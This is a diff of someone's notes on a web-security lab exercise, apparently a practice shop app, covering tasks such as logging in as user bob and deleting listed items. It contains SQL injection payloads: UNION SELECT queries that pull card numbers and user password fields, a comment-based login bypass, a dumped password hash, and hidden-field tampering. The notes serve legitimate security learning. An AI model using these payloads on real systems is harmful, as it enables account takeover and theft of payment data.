@@ -226,6 +226,7 @@ UNION SELECT card_id,2,3 FROM cards--
 ![[Pasted image 20260604150407.png]]
 
 UNION SELECT 1,card_name,card_no FROM cards--
+
 ![[Pasted image 20260604161128.png]]
 
 **Kaan Onar**
@@ -319,8 +320,8 @@ The CSRF token that i see here in the response is different
 
 UNION SELECT 1,2,3 FROM sqlite_master--
 
-
-## SQL injection to login to bob. 
+## There is a user bob who does a lot of talking, but no buying. Make bob buy something.
+### SQL injection to login to bob. 
 
 SELECT * FROM users WHERE username = 'bob’ - -’ AND password = 'anything';
 
@@ -335,12 +336,25 @@ https://infosecwriteups.com/from-sql-injection-to-weak-passwords-a-deep-dive-int
 
 
 
-## SQL injection in login 
+### SQL injection in login 
 
 
 ![[Pasted image 20260602113103.png]]
 
+### Trying to login from bob with previous successful SQL injection 
 
+UNION SELECT 1,user_name,password FROM users--
+
+![[Pasted image 20260605112115.png]]
+
+![[Pasted image 20260605112144.png]]
+
+![[Pasted image 20260605112157.png]]
+
+**bob**
+c00f1cd79cb8cf5507f8c3484c2d300c6aac2ea8f4f606987789662f7e5c7b72
+
+This is the hash value i guess 
 ## Delete one of the items originally listed for sale
 
 Exploiting the input type="hidden" 
@@ -365,5 +379,12 @@ and i can delete through this.
 
 ## List a new item for sale with an account you create
 
+To become a seller you need to click on this. Also when you are a moderator which we did for deleting an itemr you can;t see the want to sell part. 
+
+
+![[Pasted image 20260605110548.png]]
+
 ![[Pasted image 20260604162735.png]]
 ![[Pasted image 20260604162817.png]]
+
+What if I play with the GET request 
